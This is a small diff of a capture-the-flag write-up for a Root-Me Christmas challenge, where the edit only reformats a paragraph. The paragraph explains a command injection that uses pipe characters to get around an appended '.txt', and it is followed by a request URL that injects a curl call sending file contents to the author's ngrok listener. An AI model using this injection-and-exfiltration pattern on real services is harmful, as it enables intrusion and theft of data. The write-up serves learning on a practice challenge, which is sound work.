@@ -40,7 +40,8 @@ end
 
 <p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>
 
-Actually it was caused by the append of .txt at the end of the payload. After a few tries, I  finally came up with the exploit below consisting in putting the paylaod between 2 pipe char : | payload |. Hence what I've done had been to open a listening port on my machine, and then sent the content of the flag to my server with the request below :
+
+<p align="justify">Actually it was caused by the append of .txt at the end of the payload. After a few tries, I  finally came up with the exploit below consisting in putting the paylaod between 2 pipe char : | payload |. Hence what I've done had been to open a listening port on my machine, and then sent the content of the flag to my server with the request below :</p>
 
 ````bash
 https://day18.challenges.xmas.root-me.org/api/message?number=|curl http://ngrokFQDN:port/($cat /*)|
